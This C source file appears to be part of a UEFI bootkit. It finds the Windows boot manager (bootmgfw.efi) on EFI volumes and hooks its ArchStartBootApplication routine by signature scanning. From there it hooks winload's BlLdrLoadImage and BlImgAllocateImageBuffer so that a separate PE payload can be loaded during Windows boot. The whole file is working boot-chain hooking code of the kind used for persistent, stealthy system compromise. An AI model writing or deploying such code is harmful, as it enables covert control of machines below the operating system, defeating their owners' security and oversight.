#include "BootMgfw.h"

SHITHOOK BootMgfwShitHook;
EFI_DEVICE_PATH* EFIAPI GetBootMgfwPath(VOID)
{
	UINTN HandleCount = NULL;
	EFI_STATUS Result;
	EFI_HANDLE* Handles = NULL;
	EFI_DEVICE_PATH* DevicePath = NULL;
	EFI_FILE_HANDLE VolumeHandle;
	EFI_FILE_HANDLE BootMgfwHandle;
	EFI_FILE_IO_INTERFACE* FileSystem = NULL;

	// get all the handles to file systems...
	if (EFI_ERROR((Result = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &Handles))))
	{
		Print(L"error getting file system handles -> 0x%p\n", Result);
		return DevicePath;
	}

	// for each handle to the file system, open a protocol with it...
	for (UINT32 Idx = 0u; Idx < HandleCount && !FileSystem; ++Idx)
	{
		if (EFI_ERROR((Result = gBS->OpenProtocol(Handles[Idx], &gEfiSimpleFileSystemProtocolGuid, (VOID**)&FileSystem, gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL))))
		{
			Print(L"error opening protocol -> 0x%p\n", Result);
			return DevicePath;
		}

		if (EFI_ERROR((Result = FileSystem->OpenVolume(FileSystem, &VolumeHandle))))
		{
			Print(L"error opening file system -> 0x%p\n", Result);
			return DevicePath;
		}

		// if we found the correct file (\\efi\\microsoft\\boot\\bootmgfw.efi)
		if (!EFI_ERROR(VolumeHandle->Open(VolumeHandle, &BootMgfwHandle, WINDOWS_BOOTMGR_PATH, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY)))
			DevicePath = FileDevicePath(Handles[Idx], WINDOWS_BOOTMGR_PATH);

		VolumeHandle->Close(BootMgfwHandle);
		if (EFI_ERROR((Result = gBS->CloseProtocol(Handles[Idx], &gEfiSimpleFileSystemProtocolGuid, gImageHandle, NULL))))
		{
			Print(L"error closing protocol -> 0x%p\n", Result);
			return DevicePath;
		}
	}
	return DevicePath;
}

EFI_STATUS EFIAPI InstallBootMgfwHooks(EFI_HANDLE BootMgfwPath)
{
	EFI_STATUS Result = EFI_SUCCESS;
	EFI_LOADED_IMAGE* BootMgfw = NULL;

	if (EFI_ERROR((Result = gBS->HandleProtocol(BootMgfwPath, &gEfiLoadedImageProtocolGuid, (VOID**)&BootMgfw))))
		return Result;

	Print(L"Image Base -> 0x%p\n", BootMgfw->ImageBase);
	Print(L"Image Size -> 0x%x\n", BootMgfw->ImageSize);

	VOID* ArchStartBootApplication = 
		FindPattern(
			BootMgfw->ImageBase, 
			BootMgfw->ImageSize,
			START_BOOT_APPLICATION_SIG, 
			START_BOOT_APPLICATION_MASK
		);

	Print(L"ArchStartBootApplication -> 0x%p\n", ArchStartBootApplication);
	MakeShitHook(&BootMgfwShitHook, ArchStartBootApplication, &ArchStartBootApplicationHook, TRUE);
	return Result;
}

EFI_STATUS EFIAPI ArchStartBootApplicationHook(VOID* AppEntry, VOID* ImageBase, UINT32 ImageSize, UINT8 BootOption, VOID* ReturnArgs)
{
	DisableShitHook(&BootMgfwShitHook);
	VOID* LdrLoadImage = GetExport(ImageBase, "BlLdrLoadImage");
	VOID* ImgAllocateImageBuffer =
		FindPattern(
			ImageBase,
			ImageSize,
			ALLOCATE_IMAGE_BUFFER_SIG,
			ALLOCATE_IMAGE_BUFFER_MASK
		);

	Print(L"PE PayLoad Size -> 0x%x\n", GetGoldenRecordSize());
	Print(L"winload base -> 0x%p\n", ImageBase);
	Print(L"winload size -> 0x%x\n", ImageSize);
	Print(L"winload.BlLdrLoadImage -> 0x%p\n", LdrLoadImage);
	Print(L"winload.BlImgAllocateImageBuffer -> 0x%p\n", ImgAllocateImageBuffer);
	MakeShitHook(&WinLoadImageShitHook, LdrLoadImage, &BlLdrLoadImage, TRUE);
	MakeShitHook(&WinLoadAllocateImageHook, ImgAllocateImageBuffer, &BlImgAllocateImageBuffer, TRUE);
	return ((IMG_ARCH_START_BOOT_APPLICATION)BootMgfwShitHook.Address)(AppEntry, ImageBase, ImageSize, BootOption, ReturnArgs);
}